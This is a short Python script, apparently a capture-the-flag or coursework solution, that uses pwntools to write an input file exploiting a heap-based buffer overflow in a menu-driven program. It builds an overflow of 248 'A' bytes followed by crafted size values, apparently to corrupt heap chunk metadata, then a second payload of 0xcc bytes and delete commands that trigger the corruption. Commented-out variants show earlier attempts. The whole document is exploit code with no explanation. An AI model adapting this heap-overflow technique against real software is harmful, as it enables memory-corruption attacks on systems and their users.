from pwn import *

if __name__ == '__main__':
    insert_pay = str.encode("a\n255\n")
    # payload = b"\x41" *  + b'\x08\x01\x00\x00' + b'\x48\x00\x00\x00' + b'\xa4\x90\x04\x08' + b'\xb6\x93\x04\x08'
    # pay = b"\x41" * 255 + b'\n'

    # pay = b"\x41" * 255 + b'\n' + b'\xfc\xff\xff\xff' + b'\xfc\xff\xff\xff'


    pay = b"\x41" * 248 + b'\n' + b'\xf0\x00\x00\x00' + b'\xfc\xff\xff\xff'  + b'\n'
        # say that its unlocked
    
    add_block = b'a\n'
    add_bof_size = b'1\n'
    # pay_2 = add_block + add_bof_size + b'\xcc\xcc\xcc\xcc' + b'\x48\x00\x00\x00' + b"\xcc" * 150 + b'\n'
    pay_2 = b'\xcc\xcc\xcc\xcc' + b'\x48\x00\x00\x00' + b"\xcc" * 150 + b'\n'
    
    
     
    
    insert_small_block = str.encode("a\n1\nA\n")
    del_small_block_0 = str.encode("d\n0\n")
    del_small_block_1 = str.encode("d\n1\n")
    del_small_block_2 = str.encode("d\n2\n")

    with open("input", "wb") as binary_file:
        binary_file.write(insert_pay)
        binary_file.write(pay)
        binary_file.write(insert_pay)
        binary_file.write(pay_2)
        binary_file.write(del_small_block_0)

        # binary_file.write(insert_small_block)
        # binary_file.write(del_small_block_1)
        # binary_file.write(insert_small_block)
        # binary_file.write(del_small_block_2)